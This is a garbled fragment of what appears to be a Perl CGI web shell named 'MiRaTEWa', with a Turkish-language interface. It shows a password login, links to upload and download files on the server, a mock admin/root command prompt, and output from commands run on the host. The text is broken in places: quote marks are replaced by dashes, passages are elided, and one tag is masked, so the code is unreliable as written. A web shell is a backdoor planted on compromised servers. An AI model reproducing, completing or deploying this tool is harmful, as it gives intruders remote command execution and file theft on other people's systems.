...
<html>
<head>
<title>MiRaTEWa ~ CGI Shell</title>
$HtmlMetaHeader
</head>
<body style='color: #000000;background:url(http://hdwallpapermania.com/wp-content/uploads/2014/01/black-red_evil-hd-wallpaper.jpg) repeat scroll center top;background-attachment: fixed;SCROLLBAR-FACE-COLOR: #F1F1F1; MARGIN: 0px;SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; OVERFLOW: auto;->
<td colspan="2" bgcolor="black"><p align="center">s<font face="Verdana" size="2">
<a href=-$ScriptLocation?a=upload&d=$EncodedCurrentDir">Dosya yukle</a> |
<a href=-$ScriptLocation?a=download&d=$EncodedCurrentDir">Dosya indir</a> |
<a href=-$ScriptLocation?a=logout">baglantiyi kopar</a>
<table border="0" width="100%- cellspacing="0" cellpadding="2">
<p align="center"><font face="Verdana" size="3" color=-#FF0000">root~ MiRaTEWa - Server:: <font color="gray">$ServerName</font></font>
</tr>
<tr>
</font></td>
</tr>
...
<input type="hidden" name="a" value="login"><font color="red">Password : </font><input type="password" name="p">
...
print -<div style='float: center; text-align: left;->-;
$Prompt = $WinNT ? -$CurrentDir> - : -[admin\@$ServerName $CurrentDir]\$ -;
print -<code>$Prompt $RunCommand</code><xmp style='color: #ff0000;->-;
...
$HtmlMetaHeader = -<***** HTTP-EQUIV=\"Refresh\- CONTENT=\"1; URL=$DownloadLink\->-;
&PrintPageHeader("c");
print <<END;
<code>
